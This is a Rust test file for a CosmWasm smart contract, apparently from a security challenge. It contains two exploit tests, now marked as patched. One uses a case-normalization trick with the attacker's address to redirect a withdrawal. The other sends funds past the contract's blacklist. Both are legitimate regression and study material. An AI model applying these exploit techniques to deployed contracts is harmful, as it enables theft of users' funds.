#[cfg(test)]
pub mod tests{
    use cosmwasm_std::{coin, Addr};
    use cw_multi_test::{App, Executor};

    use crate::{msg::{InstantiateMsg, ExecuteMsg}, integration_tests::tests::{challenge_contract, mint_native, query_balance_native, OWNER, DENOM}};
    
    pub const ATTACKER : &str = "attacker";
    pub const ATTACKER_2 : &str = "ATTACKER";

    #[ignore = "exploit patched"]
    #[test]
    pub fn exploit_normalization(){
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        let contract_addr = app
        .instantiate_contract(
            cw_template_id,
            Addr::unchecked(ATTACKER),
            &InstantiateMsg { owner: Addr::unchecked(ATTACKER).to_string(), black_list: None },
            &[],
            "Contract",
            None,
        )
        .unwrap();

        mint_native(&mut app, contract_addr.to_string(), DENOM.to_string(), 100);


        app.execute_contract(
            Addr::unchecked(ATTACKER), 
            contract_addr.clone(), 
            &ExecuteMsg::Withdraw { destination: ATTACKER_2.to_string()},
            &[]).unwrap();
            
        let balance = query_balance_native(&app, &Addr::unchecked(ATTACKER), DENOM);
        assert_eq!(coin(100, DENOM), balance);

    }

    #[ignore = "exploit patched"]
    #[test]
    pub fn exploit_blacklist(){
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        let black_list = vec![Addr::unchecked(ATTACKER)];
        let contract_addr = app
        .instantiate_contract(
            cw_template_id,
            Addr::unchecked(OWNER),
            &InstantiateMsg { owner: Addr::unchecked(OWNER).to_string(), black_list: Some(black_list) },
            &[],
            "Contract",
            None,
        )
        .unwrap();

        mint_native(&mut app, contract_addr.to_string(), DENOM.to_string(), 100);


        app.execute_contract(
            Addr::unchecked(OWNER), 
            contract_addr.clone(), 
            &ExecuteMsg::Withdraw { destination: ATTACKER.to_string()},
            &[]).unwrap();
            
        let balance = query_balance_native(&app, &Addr::unchecked(ATTACKER), DENOM);
        assert_eq!(coin(100, DENOM), balance);


    }
}